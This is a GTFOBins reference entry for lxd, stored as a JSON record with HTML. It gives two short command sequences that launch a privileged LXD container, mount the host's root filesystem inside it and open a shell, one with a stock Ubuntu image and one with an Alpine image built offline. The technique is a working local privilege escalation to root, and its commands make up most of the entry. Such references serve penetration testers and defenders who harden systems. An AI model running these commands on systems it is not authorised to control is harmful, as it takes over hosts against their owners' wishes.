{"title": "lxd", "source": "gtfobins", "source_label": "GTFOBins", "path": "lxd", "html": "<h1>lxd</h1>\n<h2>Shell</h2>\n<p>The image (e.g., `ubuntu:16.04`) must be present already, otherwise it will be downloaded.</p>\n<pre><code class=\"language-bash\">lxc init ubuntu:16.04 x -c security.privileged=true\nlxc config device add x x disk source=/ path=/mnt/ recursive=true\nlxc start x\nlxc exec x /bin/sh</code></pre>\n<p>This requires steps to be run offline, then the resulting image must be uploaded to target. Build the local image with [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder):\n\n```\ngit clone https://github.com/saghul/lxd-alpine-builder\ncd lxd-alpine-builder\nsudo ./build-alpine -a i686\n```</p>\n<pre><code class=\"language-bash\">lxc image import ./alpine*.tar.gz --alias x\nlxc init x x -c security.privileged=true\nlxc config device add x x disk source=/ path=/mnt/ recursive=true\nlxc start x\nlxc exec x /bin/sh</code></pre>", "excerpt": "lxd Shell The image (e.g., `ubuntu:16.04`) must be present already, otherwise it will be downloaded. lxc init ubuntu:16.04 x -c security.privileged=true lxc config device add x x disk source=/ path=/mnt/ recursive=true lxc start x lxc exec x /bin/sh…", "tags": ["func:shell", "ctx:sudo", "ctx:suid"]}